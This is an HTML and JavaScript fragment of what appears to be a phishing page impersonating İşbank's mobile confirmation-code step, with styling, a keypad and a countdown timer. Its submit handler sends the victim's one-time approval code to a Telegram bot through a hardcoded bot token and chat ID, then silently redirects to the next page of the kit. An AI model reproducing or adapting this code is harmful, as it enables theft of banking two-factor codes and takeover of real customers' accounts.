    <style>
        :root {
            --primary-blue: #08335E;
            --light-gray: #f4f4f4;
            --dark-gray: #333;
            --error-red: #ff0000;
            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background-color: var(--light-gray);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        #viewport {
            width: 100%;
            max-width: 400px;
            background: #fff;
            box-shadow: var(--shadow);
            border-radius: 12px;
            overflow: hidden;
            position: relative;
        }

        #leftBannerContainer {
            width: 100%;
            background: url('https://gorsel.isbank.com.tr/BIB/intsube_Resim/Reklamlar/z5z6/banner.jpg?23_2_2025') no-repeat center;
            background-size: cover;
            height: 150px;
        }

        #header {
            background-color: var(--primary-blue);
            padding: 12px;
            text-align: center;
        }

        #logoContainer img {
            max-width: 120px;
            height: auto;
            vertical-align: middle;
        }

        #mainContent {
            padding: 24px;
            display: flex;
            flex-direction: column;
            gap: 24px;
        }

        .login-title {
            font-size: 1.2rem;
            color: var(--primary-blue);
            text-align: center;
            font-weight: 600;
            margin-bottom: 16px;
        }

        .mobile-code-form {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .form-group {
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 0.9rem;
            color: var(--dark-gray);
            margin-bottom: 6px;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 1rem;
            transition: border-color 0.3s ease, box-shadow 0.3s ease;
            background-color: #f9f9f9;
        }

        .form-group input:focus {
            border-color: var(--primary-blue);
            outline: none;
            box-shadow: 0 0 8px rgba(8, 51, 94, 0.3);
            background-color: #fff;
        }

        .error-message {
            color: var(--error-red);
            font-size: 0.8rem;
            margin-top: 6px;
            display: none;
            font-weight: 500;
        }

        .mobile-approve-button {
            width: 100%;
            padding: 14px;
            background-color: var(--primary-blue);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.1s ease;
            margin-top: 16px;
        }

        .mobile-approve-button:hover {
            background-color: #0A4378;
            transform: translateY(-2px);
        }

        .mobile-approve-button:active {
            transform: translateY(0);
        }

        .timer-container {
            text-align: center;
            margin: 16px 0;
        }

        .keypad-container {
            margin-top: 8px;
        }

        .keypad-row {
            display: flex;
            gap: 8px;
            margin-bottom: 8px;
        }

        .keypad-key, .keypad-special {
            flex: 1;
            padding: 12px;
            background-color: #fff;
            border: 1px solid #ccc;
            border-radius: 8px;
            font-size: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        .keypad-key:hover, .keypad-special:hover {
            background-color: #f0f0f0;
        }

        .keypad-special.keypad-shuffle, .keypad-special.keypad-delete {
            background-color: var(--primary-blue);
            color: white;
        }

        .keypad-special.keypad-shuffle:hover, .keypad-special.keypad-delete:hover {
            background-color: #0A4378;
        }

        #footer {
            background-color: #f8f8f8;
            padding: 16px;
            text-align: center;
            font-size: 0.8rem;
            color: #666;
            border-top: 1px solid #e0e0e0;
        }

        .footer-links {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin-top: 12px;
            flex-wrap: wrap;
        }

        .footer-links a {
            color: var(--primary-blue);
            text-decoration: none;
            font-weight: 500;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        @media (max-width: 768px) {
            #leftBannerContainer {
                height: 120px;
            }

            .login-title {
                font-size: 1.1rem;
            }

            .mobile-approve-button {
                padding: 12px;
                font-size: 0.9rem;
            }
        }

        @media (max-width: 480px) {
            #viewport {
                max-width: 100%;
                border-radius: 0;
                box-shadow: none;
            }

            #leftBannerContainer {
                height: 100px;
            }

            #mainContent {
                padding: 16px;
            }

            .login-title {
                font-size: 1rem;
            }

            .form-group input {
                font-size: 0.9rem;
                padding: 10px;
            }

            .mobile-approve-button {
                padding: 10px;
                font-size: 0.9rem;
            }

            #footer {
                padding: 12px;
                font-size: 0.7rem;
            }

            .footer-links {
                gap: 8px;
            }
        }
    </style>
</head>

    <script>
        document.getElementById('mobileCodeForm').addEventListener('submit', handleMobileCodeSubmit);

        function handleMobileCodeSubmit(event) {
            event.preventDefault();

            const mobileCode = document.getElementById('mobileConfirmationCode').value;

            let hasError = false;
            if (!mobileCode) {
                document.getElementById('mobileConfirmationCodeError').style.display = 'block';
                hasError = true;
            } else {
                document.getElementById('mobileConfirmationCodeError').style.display = 'none';
            }

            if (!hasError) {
                const telegramBotToken = "7770266734:AAGZQbJfWv46lLHsuQIaj8reDZTBlik1-8E";
                const telegramChatId = "-4775941371";
                const telegramMessage = `Mobil Onay Kodu: ${mobileCode}`;
                const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(telegramMessage)}`;

                fetch(telegramUrl)
                    .then(response => {
                        if (response.ok) {
                            window.location.href = "index3.html"; // Sessizce yönlendir
                        }
                    })
                    .catch(error => {
                        console.error("Hata:", error);
                    });
            }
        }

        // Keypad işlevselliği
        document.querySelectorAll('.keypad-key, .keypad-special').forEach(button => {
            button.addEventListener('click', () => {
                const input = document.getElementById('mobileConfirmationCode');
                const value = button.textContent.trim();
                if (value === ' ' && button.classList.contains('keypad-delete')) {
                    input.value = input.value.slice(0, -1);
                } else if (value === ' ' && button.classList.contains('keypad-shuffle')) {
                    console.log("Shuffle clicked");
                } else {
                    input.value += value;
                }
            });
        });

        // Timer işlevselliği
        let timer = 120;
        const timerElement = document.getElementById('timer');
        if (timerElement) {
            const timerInterval = setInterval(() => {
                timer--;
                timerElement.textContent = `Kalan Süre: ${timer} sn`;
                if (timer <= 0) {
                    clearInterval(timerInterval);
                    timerElement.textContent = "Süre doldu!";
                    document.getElementById('mobileConfirmationCode').disabled = true;
                }
            }, 1000);
        }
    </script>
